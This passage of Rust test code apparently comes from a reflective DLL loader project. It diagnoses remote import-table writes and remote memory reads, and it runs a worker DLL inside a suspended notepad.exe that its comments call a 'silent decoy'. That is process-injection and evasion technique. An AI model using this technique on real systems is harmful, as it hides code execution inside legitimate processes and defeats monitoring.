                    }
                    eprintln!(
                        "  iat {}::{} ord={} -> 0x{:x}",
                        String::from_utf8_lossy(dll),
                        String::from_utf8_lossy(func),
                        ord,
                        v
                    );
                }
            }
            eprintln!("S2 iat_written={}/{}", ok, n.min(4));
            if n >= fx.plan.len() {
                eprintln!("S2 ALL {} imports resolved OK", n);
                break;
            }
        }

        // ── Bisect to first failing import. ──
        if let Some(hi) = failed {
            let mut lo = last_ok;
            let mut h = hi;
            while h - lo > 1 {
                let mid = (lo + h) / 2;
                if child_dead(&fx) {
                    fx = new_fx().expect("fx respawn");
                    eprintln!("respawned fx for bisect mid={mid}");
                }
                let (s, e) = run_stage(&fx, &fx.plan[..mid], fx.ret, fx.setup, false);
                eprintln!("bisect mid={mid}: signaled={s} exit={e:?} dead={}", child_dead(&fx));
                if e == Some(0) && !child_dead(&fx) {
                    lo = mid;
                } else {
                    h = mid;
                }
            }
            eprintln!("FIRST FAILING IMPORT index = {h}/{}", fx.plan.len());
            let (dll, func, ord, iat_va) = &fx.plan[h];
            eprintln!(
                "  dll={} func={} ord={} iat_va=0x{:x}",
                String::from_utf8_lossy(dll),
                String::from_utf8_lossy(func),
                ord,
                iat_va
            );
            // Dump the failing entry + its strings from the REMOTE setup page.
            if let Ok(b) = unsafe { remote_read(fx.hp, fx.setup, 0x80) } {
                eprintln!("  setup[0..0x80]: {b:02x?}");
            }
            if let Ok(b) = unsafe {
                remote_read(fx.hp, fx.setup + 0x20 + h * 32, 32)
            } {
                eprintln!("  entry[{h}] raw: {b:02x?}");
                let dp = u64::from_le_bytes(b[0..8].try_into().unwrap());
                let fp = u64::from_le_bytes(b[8..16].try_into().unwrap());
                for (tag, p) in [("dll", dp), ("func", fp)] {
                    if let Ok(sb) = unsafe { remote_read(fx.hp, p as usize, 64) } {
                        let s = sb
                            .iter()
                            .take_while(|&&c| c != 0)
                            .copied()
                            .collect::<Vec<u8>>();
                        eprintln!("  {tag} @0x{p:x} = '{}'", String::from_utf8_lossy(&s));
                    }
                }
            }
        }

        let _ = native::terminate_process_handle(fx.hp);
        let _ = native::close_handle(fx.hp);
    }

    /// Full reflective path on real AD worker DLL (TLS emulation + suspended
    /// decoy). Failure is a hard regression.
    #[test]
    #[cfg(windows)]
    fn reflective_ad_dll_e2e_or_diagnose() {
        let path = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../target/debug/ad_worker.dll");
        if !path.is_file() {
            eprintln!("skip: ad_worker.dll not built");
            return;
        }
        let pe = std::fs::read(&path).expect("read");
        let layout = parse_pe_layout(&pe).expect("layout");
        let x1 = resolve_export_rva(&pe, &layout, b"x1").expect("x1 export must exist");
        eprintln!(
            "ad dll soi=0x{:x} entry=0x{:x} x1=0x{:x} imports_rva=0x{:x}",
            layout.size_of_image, layout.entry_rva, x1, layout.import_rva
        );
        let body = br#"{"request_id":"diag","op":"ping","params":{},"deadline_ms":10000}"#;
        let mut frame = Vec::new();
        frame.extend_from_slice(&(body.len() as u32).to_le_bytes());
        frame.extend_from_slice(body);
        // The host is spawned suspended (main thread never runs), so even
        // Win11 app stubs like notepad.exe work as a silent decoy.
        let host = "\"C:\\Windows\\System32\\notepad.exe\"";
        match spawn_reflective_worker(&pe, &frame, 12_000, host) {
            Ok((o, e)) => {
                eprintln!(
                    "e2e ok out={} err={}",
                    String::from_utf8_lossy(&o),
                    String::from_utf8_lossy(&e)
                );
                assert!(
                    !o.is_empty() || !e.is_empty(),
                    "expected worker framed output"
                );
            }
            Err(err) => {
                // TLS emulation + suspended decoy are implemented; failure is a
                // regression.
                panic!("reflective e2e failed (regression): {err}");
            }
        }
    }
}
